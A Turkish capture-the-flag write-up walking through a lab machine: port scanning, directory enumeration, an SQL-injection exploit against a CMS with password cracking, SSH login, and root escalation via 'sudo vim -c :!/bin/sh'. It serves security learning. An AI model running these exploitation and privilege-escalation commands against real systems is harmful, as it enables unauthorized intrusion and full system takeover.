Öncelikle, hızlı bir port taraması yapmak için RustScan kullanıldı. RustScan’i tercih etmemin sebebi, Nmap’e kıyasla daha hızlı olmasıdır. Ardından, RustScan’den elde ettiğimiz sonuçları detaylı analiz için Nmap’e aktardık.

```bash
rustscan -a 10.10.137.100
```

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Making sure 'closed' isn't just a state of mind.

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit
Open 10.10.137.100:21
Open 10.10.137.100:80
Open 10.10.137.100:2222

```
---

RustScan çıktısında 21, 80 ve 2222 portlarının açık olduğunu tespit ettik. Daha detaylı analiz yapmak için bu portlar üzerinde Nmap ile tarama gerçekleştirdik.


```bash
nmap -Pn -sV -A -p 21,80,2222 10.10.137.100
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-29 06:34 EDT
Nmap scan report for 10.10.137.100
Host is up (0.087s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.21.233.156
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 (97%), Linux 4.4 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 3.10 - 3.13 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   89.76 ms 10.21.0.1
2   90.82 ms 10.10.137.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.68 seconds

```
---

Nmap çıktısını analiz ettikten sonra, robots.txt dosyası ve simple adlı bir dizin olduğunu gördük. Daha sonra simple dizini içinde bir dizin taraması (dirsearch) yaparak sonuçları inceledik.

<img width="1082" height="880" alt="dirsearch" src="https://github.com/user-attachments/assets/6a89f454-2793-41f0-b58e-518047a1752d" />

---

Dirsearch’ten elde ettiğimiz bilgilerle siteyi ziyaret ettik. Ayrıca, bir login paneli olduğunu fark ettik ve burayı da incelemeye başladık.

<img width="1679" height="793" alt="simple" src="https://github.com/user-attachments/assets/7dd2fe04-6ca9-4a73-b799-6c7e34921c79" />

<img width="1467" height="653" alt="login" src="https://github.com/user-attachments/assets/d9e9aec9-4d5f-4ae2-929b-89c9095b26bb" />

---

Sonrasında, Simple CMS hakkında bilgi edinmek için araştırma yaptık ve bu sistemde bir SQL Injection açığı olduğunu fark ettik.

<img width="1561" height="847" alt="exploiitdb" src="https://github.com/user-attachments/assets/cfd735a9-adb9-43df-b697-987f6a1a9458" />

---

Sonrasında, bu exploit’i kullanarak sisteme erişim sağladık ve açığı başarıyla kullandık.

```bash
python3 exploit.py -u http://<your_machine_ip>/simple --crack -w /usr/share/wordlists/rockyou.txt
```

<img width="1335" height="625" alt="exploitpy" src="https://github.com/user-attachments/assets/855939ac-b754-4998-9ec6-a06547b1b6e0" />

---

Elde ettiğimiz bilgilerle 2222 portunda çalışan SSH servisine bağlandık.

<img width="699" height="389" alt="sshlogin" src="https://github.com/user-attachments/assets/5df43903-c6c3-42f7-ad8b-d5739bd474a7" />

---

Sonrasında, ilk flag olan user.txt dosyasını bulup okuduk.

```bash
$ ls
user.txt
$ cat user.txt
G00d xxx,xxxx xxx
$ 
```

---

Sonrasında sistemde başka dosya olup olmadığını kontrol ettik ve sunbath adlı başka bir dosya bulduk. Bu dosya, CTF çözümünde bize sorulan sorulardan biriydi.

```bash
# cd /home
# ls
mitch  sunbath
# 
```

---

Sonrasında, sistemde root yetkisiyle çalıştırabileceğimiz komutları görmek için "sudo -l" komutunu çalıştırdık ve bize tanımlı bir ayrıcalık olduğunu fark ettik.

```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
$ 
```

---

vim komutunu root yetkileriyle çalıştırabildiğimizi gördük ve hemen GTFObins web sitesini ziyaret ederek bu yetkiyle neler yapabileceğimizi inceledik.

<img width="1570" height="877" alt="gtfobins" src="https://github.com/user-attachments/assets/1736cc1b-f631-44fd-b7b6-ce93acf28ace" />

---

Tanımlı ayrıcalık komutunu bulup çalıştırıyoruz ve root yetkilerine yükseliyoruz. Böylece kök flagini elde ederek CTF’in sonuna geliyoruz.

```bash
$ sudo vim -c ':!/bin/sh'
```

```bash
# ^[[2;2R
/bin/sh: 1: not found
/bin/sh: 1: 2R: not found
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# ls
user.txt
# d /root
/bin/sh: 5: d: not found
# cd /root
# ls
root.txt
# cat root.txt
W3ll xxxx. xxx xxxx xxx
# 
```

---

CTF’i başarıyla tamamladık ve hedeflediğimiz iki bayrağı da elde etmeyi başardık.

---

Bu CTF Bana Ne Öğretti?

Bu CTF süreci benim için sadece teknik bilgileri pekiştirmekle kalmadı, aynı zamanda problem çözme ve sabırlı olma konusunda da önemli dersler verdi. Fark ettim ki, siber güvenlikte hızlı olmak kadar dikkatli ve sistematik çalışmak da çok önemli.

Araçları (RustScan, Nmap, Dirsearch) etkin kullanmayı öğrenmek işimi gerçekten kolaylaştırdı ve bana pratik çözümler sunan kaynakları (GTFObins gibi) nasıl araştırıp değerlendirebileceğimi gösterdi.

Ayrıca, her adımı dikkatle analiz edip öğrendiklerimi uygulamak beni bir adım daha ileri taşıdı. Bu deneyim, siber güvenlik kariyerimde ilerlemek için bana motivasyon ve özgüven verdi.

CTF’ler sayesinde gerçek dünya siber saldırılarını anlamak ve bu saldırılara karşı nasıl önlem alınacağını öğrenmek benim için artık çok daha somut ve heyecan verici hale geldi.




